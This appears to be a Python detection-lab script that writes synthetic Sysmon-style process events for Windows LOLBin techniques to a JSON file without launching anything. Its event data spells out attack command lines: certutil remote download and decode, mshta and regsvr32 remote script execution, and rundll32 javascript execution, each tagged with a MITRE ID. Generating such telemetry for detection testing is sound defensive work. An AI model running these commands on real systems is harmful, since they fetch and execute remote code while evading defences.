import json
import random
import time
from datetime import datetime
from pathlib import Path
from colorama import Fore, init

init(autoreset=True)


# ============================================================
# WINDOWS LOLBIN TELEMETRY SIMULATOR
# ============================================================

print()
print("=" * 80)
print(Fore.CYAN + " WINDOWS LOLBIN ATTACK SIMULATOR")
print("=" * 80)
print()

start = datetime.now()


# ============================================================
# PATHS
# ============================================================

BASE_DIR = Path(__file__).resolve().parents[1]

DATASET_DIR = BASE_DIR / "datasets"

DATASET_DIR.mkdir(parents=True, exist_ok=True)

EVENT_FILE = DATASET_DIR / "recon_events.json"


# ============================================================
# SIMULATED LOLBIN EVENTS
# ============================================================

events = [

    {
        "name": "CertUtil Download Simulation",
        "technique": "LOLBin Download",
        "severity": "CRITICAL",
        "mitre": "T1105",

        "Image": "C:\\Windows\\System32\\certutil.exe",

        "CommandLine":
            "certutil.exe -urlcache -f https://example.com test.txt",

        "ParentImage":
            "C:\\Windows\\System32\\cmd.exe"
    },

    {
        "name": "CertUtil Encode Simulation",
        "technique": "LOLBin Encoding",
        "severity": "HIGH",
        "mitre": "T1027",

        "Image": "C:\\Windows\\System32\\certutil.exe",

        "CommandLine":
            "certutil.exe -encode README.md encoded.txt",

        "ParentImage":
            "C:\\Windows\\System32\\cmd.exe"
    },

    {
        "name": "CertUtil Decode Simulation",
        "technique": "LOLBin Decoding",
        "severity": "HIGH",
        "mitre": "T1140",

        "Image": "C:\\Windows\\System32\\certutil.exe",

        "CommandLine":
            "certutil.exe -decode encoded.txt decoded.txt",

        "ParentImage":
            "C:\\Windows\\System32\\cmd.exe"
    },

    {
        "name": "MSHTA Simulation",
        "technique": "Remote HTA Execution",
        "severity": "CRITICAL",
        "mitre": "T1218.005",

        "Image": "C:\\Windows\\System32\\mshta.exe",

        "CommandLine":
            "mshta.exe https://example.com",

        "ParentImage":
            "C:\\Windows\\explorer.exe"
    },

    {
        "name": "Regsvr32 Simulation",
        "technique": "Remote Scriptlet Execution",
        "severity": "CRITICAL",
        "mitre": "T1218.010",

        "Image": "C:\\Windows\\System32\\regsvr32.exe",

        "CommandLine":
            "regsvr32.exe /u /n /s /i:https://example.com/test.sct scrobj.dll",

        "ParentImage":
            "C:\\Windows\\System32\\cmd.exe"
    },

    {
        "name": "Rundll32 Simulation",
        "technique": "JavaScript LOLBin",
        "severity": "CRITICAL",
        "mitre": "T1218.011",

        "Image": "C:\\Windows\\System32\\rundll32.exe",

        "CommandLine":
            'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',

        "ParentImage":
            "C:\\Windows\\explorer.exe"
    }
]


# ============================================================
# ENVIRONMENT INFORMATION
# ============================================================

def create_event(attack):

    return {
        "EventID": "1",

        "Time": datetime.now().strftime(
            "%Y-%m-%d %H:%M:%S"
        ),

        "Host": "WINDOWS-LAB",

        "User": "Daniel",

        "Image": attack["Image"],

        "ParentImage": attack["ParentImage"],

        "CommandLine": attack["CommandLine"],

        "Technique": attack["technique"],

        "Severity": attack["severity"],

        "MITRE ATT&CK": attack["mitre"]
    }


# ============================================================
# SIMULATION
# ============================================================

successful = 0
failed = 0

print(
    Fore.YELLOW +
    "[!] SAFE TELEMETRY MODE"
)

print(
    Fore.WHITE +
    "No LOLBin executables will actually be launched."
)

print(
    Fore.WHITE +
    "Synthetic security events will be written to:"
)

print(
    Fore.CYAN +
    f"{EVENT_FILE}"
)

print()


for index, attack in enumerate(events, start=1):

    print()
    print(Fore.YELLOW + "-" * 80)
    print(Fore.CYAN + f"STEP {index}")
    print("-" * 80)

    print(
        f"Technique : {attack['technique']}"
    )

    print(
        f"Severity  : {attack['severity']}"
    )

    print(
        f"MITRE     : {attack['mitre']}"
    )

    print(
        f"Image     : {attack['Image']}"
    )

    print(
        f"Command   : {attack['CommandLine']}"
    )

    print()

    try:

        event = create_event(attack)

        with open(
            EVENT_FILE,
            "a",
            encoding="utf-8"
        ) as file:

            file.write(
                json.dumps(event) + "\n"
            )

        successful += 1

        print(
            Fore.GREEN +
            "[✓] Synthetic telemetry generated"
        )

    except Exception as e:

        failed += 1

        print(
            Fore.RED +
            "[X] Simulation Failed"
        )

        print(
            Fore.RED +
            str(e)
        )

    delay = round(
        random.uniform(2.5, 4.5),
        2
    )

    print()

    print(
        f"Sleeping {delay} seconds..."
    )

    time.sleep(delay)


# ============================================================
# SUMMARY
# ============================================================

print()

print(
    Fore.CYAN +
    "=" * 80
)

print(
    Fore.CYAN +
    " LOLBIN SIMULATION SUMMARY"
)

print(
    Fore.CYAN +
    "=" * 80
)

print()

print(
    f"Started   : {start}"
)

print(
    f"Finished  : {datetime.now()}"
)

print()

print(
    Fore.GREEN +
    f"Successful : {successful}"
)

print(
    Fore.RED +
    f"Failed     : {failed}"
)

print(
    Fore.YELLOW +
    f"Events     : {len(events)}"
)

print()

print(
    Fore.CYAN +
    f"Telemetry : {EVENT_FILE}"
)

print()

print(
    Fore.CYAN +
    "=" * 80
)

print(
    Fore.GREEN +
    " Simulation Complete"
)

print(
    Fore.CYAN +
    "=" * 80
)